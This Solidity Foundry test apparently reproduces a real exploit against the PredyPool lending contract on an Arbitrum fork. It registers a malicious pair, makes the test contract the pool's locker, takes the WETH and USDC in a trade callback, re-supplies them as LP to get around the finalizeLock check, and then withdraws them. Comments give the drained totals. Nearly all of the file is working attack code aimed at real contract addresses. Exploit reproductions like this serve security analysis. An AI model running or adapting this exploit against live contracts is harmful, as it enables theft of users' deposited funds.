// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";

import "./IPredyPool.sol";

IERC20 constant USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
WETH9 constant WETH = WETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
PredyPool constant predyPool = PredyPool(
    0x9215748657319B17fecb2b5D086A3147BFBC8613
);

contract PredyFinanceTest is Test {
    function setUp() public {
        vm.createSelectFork("arb_one", 211107441);

        // fundingToken = address(USDC);
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(predyPool), "PredyPool");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        USDC.approve(address(predyPool), type(uint256).max);
        WETH.approve(address(predyPool), type(uint256).max);

        print("USDC", USDC.balanceOf(address(this)), USDC.decimals());
        print("WETH", WETH.balanceOf(address(this)), 18);

        AddPairLogic.AddPairParams memory addPairParam = AddPairLogic
            .AddPairParams({
                marginId: address(WETH),
                poolOwner: address(this),
                uniswapPool: address(
                    0xC6962004f452bE9203591991D15f6b388e09E8D0
                ),
                priceFeed: address(this),
                whitelistEnabled: false,
                fee: 0,
                assetRiskParams: Perp.AssetRiskParams({
                    riskRatio: 100_000_001,
                    debtRiskRatio: 0,
                    rangeSize: 1000,
                    rebalanceThreshold: 500,
                    minSlippage: 1_005_000,
                    maxSlippage: 1_050_000
                }),
                quoteIrmParams: InterestRateModel.IRMParams({
                    baseRate: 10_000_000_000_000_000,
                    kinkRate: 900_000_000_000_000_000,
                    slope1: 500_000_000_000_000_000,
                    slope2: 1_000_000_000_000_000_000
                }),
                baseIrmParams: InterestRateModel.IRMParams({
                    baseRate: 10_000_000_000_000_000,
                    kinkRate: 900_000_000_000_000_000,
                    slope1: 500_000_000_000_000_000,
                    slope2: 1_000_000_000_000_000_000
                })
            });
        uint256 pairId = predyPool.registerPair(addPairParam);
        // register pair, the owner of the pair is attack contract

        IPredyPool.TradeParams memory tradeParams = IPredyPool.TradeParams({
            pairId: pairId,
            vaultId: 0,
            tradeAmount: 0,
            tradeAmountSqrt: 0,
            extraData: ""
        });
        predyPool.trade(tradeParams, ""); // set the attack contract as the locker

        predyPool.withdraw(pairId, true, WETH.balanceOf(address(predyPool)));
        // withdraw the LP to the attacker

        predyPool.withdraw(pairId, false, USDC.balanceOf(address(predyPool)));
        // withdraw the LP to the attacker

        print("USDC", USDC.balanceOf(address(this)), USDC.decimals());
        print("WETH", WETH.balanceOf(address(this)), 18);
        // USDC: 219585.737814
        // WETH: 83.910994929830029848
    }

    function predyTradeAfterCallback(
        IPredyPool.TradeParams memory tradeParams,
        IPredyPool.TradeResult memory tradeResult
    ) external {
        tradeResult;

        predyPool.take(true, address(this), WETH.balanceOf(address(predyPool))); // take the asset to the attacker
        predyPool.supply(
            tradeParams.pairId,
            true,
            WETH.balanceOf(address(this))
        ); // supply the asset as LP and bypass the check in the function finalizeLock()

        predyPool.take(
            false,
            address(this),
            USDC.balanceOf(address(predyPool))
        ); // take the asset to the attacker
        predyPool.supply(
            tradeParams.pairId,
            false,
            USDC.balanceOf(address(this))
        ); // supply the asset as LP and bypass the check in the function finalizeLock()
    }

    function getSqrtPrice() external pure returns (uint256) {
        return 40_000_000_000;
    }
}
